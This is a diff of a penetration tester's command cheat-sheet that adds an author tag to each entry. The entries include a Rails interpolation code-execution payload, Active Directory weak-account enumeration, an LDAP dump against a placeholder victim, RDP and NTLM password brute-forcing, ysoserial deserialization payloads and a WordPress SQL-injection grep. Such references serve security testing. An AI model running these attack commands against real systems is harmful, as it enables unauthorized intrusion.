@@ -1,5 +1,6 @@
 POST: {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }}
 Ruby on Rails String Interpolation  : anything in #{} is executed
+Innes
 EOC
 ruby
 web application
@@ -8,6 +9,7 @@ http://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-rem
 EOR
 Get-ADUser -Filter 'useraccountcontrol -band 65536' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv
 Check for accounts that don't have password expiry set
+Innes
 EOC
 enumeration
 user information
@@ -18,6 +20,7 @@ https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_r
 EOR
 Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv
 Check for accounts that have no password requirement
+Innes
 EOC
 enumeration
 windows
@@ -28,6 +31,7 @@ https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_r
 EOR
 Get-ADUser -Filter 'useraccountcontrol -band 128' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv
 Accounts that have the password stored in a reversibly encrypted format
+Innes
 EOC
 enumeration
 windows
@@ -38,6 +42,7 @@ https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_r
 EOR
 Get-ADUser -Filter 'useraccountcontrol -band 524288' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv
 List users that are trusted for Kerberos delegation
+Innes
 EOC
 enumeration
 windows
@@ -51,6 +56,7 @@ http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-pr
 EOR
 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv
 List accounts that don't require pre-authentication
+Innes
 EOC
 enumeration
 windows
@@ -61,6 +67,7 @@ https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_r
 EOR
 Get-ADUser -Filter 'useraccountcontrol -band 2097152' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv
 List accounts that have credentials encrypted with DES
+Innes
 EOC
 enumeration
 windows
@@ -71,6 +78,7 @@ https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_r
 EOR
 ldapsearch -x -LLL -E pr=200/noprompt -h [victim] -D "[domain]\\[user]" -w '[password]' -b "dc=[fqdn],dc=co,dc=uk"
 Dump Ldap structure
+Innes
 EOC
 ldap
 enumeration
@@ -82,6 +90,7 @@ https://www.ibm.com/support/knowledgecenter/en/SSKTMJ_9.0.1/admin/conf_exampleso
 EOR
 ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
 brute force RDP
+Innes
 EOC
 brute
 linux
@@ -90,6 +99,7 @@ https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
 EOR
 /opt/jre1.8.0_91/bin/javaws [something].jnlp
 run a java web start JNLP
+Innes
 EOC
 java
 EOT
@@ -97,6 +107,7 @@ https://www.java.com/en/download/faq/java_webstart.xml
 EOR
 /opt/jre1.8.0_91/bin/jcontrol
 Open java control pannel
+Innes
 EOC
 java
 EOT
@@ -104,6 +115,7 @@ http://linuxsysconfig.com/2013/12/how-to-enable-java-console-on-rpm-based-linux-
 EOR
 Custom iterator -> 1 + Seperator for 1 ->  2 -> payload processing b64 
 brute force HTTP basic burp
+Innes
 EOC
 brute
 web application
@@ -112,6 +124,7 @@ http://security-geek.in/2014/08/22/using-burp-suite-to-brute-force-http-auth-att
 EOR
 for i in `cat [users]`; do for j in `cat [passwords]`; do wget -c --http-user='[domain]\$i' --http-password=$j https://[url] --no-check-certificate -e use_proxy=yes -e https_proxy=127.0.0.1:8080 2>index.html; grep -i fail index.html; rm index.html; echo $i:$j; echo "___" ; done; done | tee ntlm_brute
 NTLM brute force, if msf is broke : assumes fail is in Index, curl is still bugged?
+Innes
 EOC
 brute
 web application
@@ -120,6 +133,7 @@ http://honglus.blogspot.co.uk/2010/06/use-script-to-fetch-url-protected-by.html
 EOR
 java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '[command]' > payload.out
 YsoSerial code execution 
+Innes
 EOC
 Java
 Web application
@@ -129,6 +143,7 @@ http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-
 EOR
 grep -ir wpdb . | egrep -i "get_r|insert|escape|query" | egrep "_GET|_POST|_REQUEST|\$" | grep --color wpdb.
 Very Basic SQLI test in wp plugin
+Innes
 EOC
 web application
 sql injection
